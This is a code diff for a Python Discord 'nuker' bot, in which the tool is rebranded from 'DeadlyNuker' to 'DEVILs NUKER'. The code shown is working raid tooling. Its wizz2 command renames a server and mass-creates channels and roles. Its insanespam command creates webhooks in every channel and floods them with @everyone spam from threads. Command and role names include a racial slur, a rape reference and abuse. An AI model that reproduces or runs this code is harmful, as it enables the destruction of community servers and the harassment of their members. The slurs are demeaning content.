@@ -12,7 +12,7 @@ prefix = ("$")
 
 
 RICHY = discord.Client()
-RICHY = commands.Bot(description='RAPE', command_prefix=prefix, self_bot=False)
+RICHY = commands.Bot(description='RAPE', command_prefix=prefix,)
 
 
 
@@ -23,18 +23,18 @@ RICHY.remove_command('help')
 
 
 @RICHY.command()
-async def deadlynuke(ctx):
+async def help(ctx):
     await ctx.message.delete()
     embed = discord.Embed(color=0)
     embed.set_author(name='RICHY OP')
     embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/829355879848607775/841192543177277450/image0.gif')
-    embed.set_footer(text='RICHY | DEADLY NUKE')
+    embed.set_footer(text='RICHY | DEVILs NUKER')
     embed.add_field(name='___**YOUR SERVER IS DEAD**___', value='```THIS IS THE ULTIMATE KILLER THAT I EVER CREATED```')
     embed.add_field(name='___**COMMANDS**___', value='**wizz (starts the Murder), stopnigga (stops the Procedure of murder)**')
     embed.add_field(name='___**INSANESPAM**___', value='**unstoppable webhookspam**')
     embed.add_field(name='___**wizz2**___', value='**trashes the server**')
     embed.add_field(name='___**botinfo**___', value='**shows bots info**')
-    embed.add_field(name='**DEADLY NUKE**', value='```KILLS THE SERVER AND DESTROYS YOUR MOBILE```')
+    embed.add_field(name='**DEVILs NUKER**', value='```KILLS THE SERVER AND DESTROYS YOUR MOBILE```')
     await ctx.send(embed=embed) 
   
   
@@ -42,8 +42,8 @@ async def deadlynuke(ctx):
 async def botinfo(ctx):
     await ctx.message.delete()
     embed = discord.Embed(color=0)
-    embed.set_author(name='DEADLY NUKER v2 | BOT INFO')
-    embed.set_footer(text='DEADLY NUKER v2 | BOT INFO')
+    embed.set_author(name='DEVILs NUKER v2 | BOT INFO')
+    embed.set_footer(text='DEVILs NUKER v2 | BOT INFO')
     embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/829355879848607775/841192543177277450/image0.gif')
     embed.add_field(name='___**BOT INFO**___', value='```ALL THE INFO ABOUT BOT```')
     embed.add_field(name='___**DEVELOPER**___', value='<:botdev:841043220191641651> **insane X richy <\> xBRV#8366**')
@@ -73,19 +73,19 @@ async def wizz2(ctx):
             pass
 
     try:
-        await ctx.guild.edit(name='Wizzed by DeadlyNuker',
-          description='Deadly got no chill',
-          reason='ripped by deadlynuker',
+        await ctx.guild.edit(name='Wizzed by devils nuker',
+          description='DEVILs got no chill',
+          reason='ripped by DEVILs',
           icon=None,
           banner=None)
     except:
         pass
 
     for _i in range(100):
-        await ctx.guild.create_text_channel(name='Wizzed By DeadlyNuker')
+        await ctx.guild.create_text_channel(name='Wizzed By DEVILsNuker')
 
     for _i in range(100):
-        await ctx.guild.create_role(name='deadly fucks you', color=(RandomColor()))
+        await ctx.guild.create_role(name='DEVILs fucks you', color=(RandomColor()))
 
 
 format = '%a, %d %b %Y | %H:%M:%S %ZGMT'
@@ -98,24 +98,24 @@ def ssspam(webhook):
         randcolor = random.randint(0, 16777215)
         data = {'content':'@everyone wizzed by deadlynuker',
          'embeds':[
-          {'title':'Deadlynuker',
+          {'title':'DEVILsnuker',
            'tts':'true',
            'description':'.',
            'url':'https://instagram.com/_jotarokujo_123',
            'color':randcolor,
            'fields':[
-            {'name':'Deadlynuker',
+            {'name':'DEVILsnuker',
              'value':'.'},
-            {'name':'Deadlynuker',
+            {'name':'DEVILsnuker',
              'value':'.'},
-            {'name':'Deadlynuker',
+            {'name':'DEVILsnuker',
              'value':'.'},
             {'name':'.',
              'value':'.'}],
-           'author':{'name':'DeadlyNuker',
+           'author':{'name':'DEVILsNuker',
             'url':'https://cdn.discordapp.com/attachments/767242291794280449/841207950293860382/image0.gif',
             'icon_url':'https://cdn.discordapp.com/attachments/767242291794280449/841207950293860382/image0.gif'},
-           'footer':{'text':'DeadlyNuker by RichY',
+           'footer':{'text':'DEVILsNuker by RichY',
             'icon_url':'https://cdn.discordapp.com/attachments/767242291794280449/841207950293860382/image0.gif'},
            'image':{'url': 'https://cdn.discordapp.com/attachments/767242291794280449/841207950293860382/image0.gif'},
            'thumbnail':{'url': 'https://cdn.discordapp.com/attachments/767242291794280449/841207950293860382/image0.gif'}},
@@ -125,7 +125,7 @@ def ssspam(webhook):
            'image':{'url': 'https://cdn.discordapp.com/attachments/767242291794280449/841207950293860382/image0.gif'}},
           {'url':'https://instagram.com/_jotarokujo_123',
            'image':{'url': 'https://cdn.discordapp.com/attachments/767242291794280449/841207950293860382/image0.gif'}}],
-         'username':'WIZZED BY DEADLY',
+         'username':'WIZZED BY Devils',
          'avatar_url':'https://cdn.discordapp.com/attachments/767242291794280449/841207950293860382/image0.gif'}
         spamming = requests.post(webhook, json=data)
         spammingerror = spamming.text
@@ -162,7 +162,7 @@ async def insanespam(ctx):
     for i in range(webhookamount):
         for channel in ctx.guild.text_channels:
             try:
-                webhook = await channel.create_webhook(name='Wizzed by DeadlyNuker')
+                webhook = await channel.create_webhook(name='Wizzed by DEVILsNuker')
                 threading.Thread(target=ssspam, args=(webhook.url,)).start()
                 f = open('data/webhooks-' + str(ctx.guild.id) + '.txt', 'a')
                 f.write(f"{webhook.url} \n")
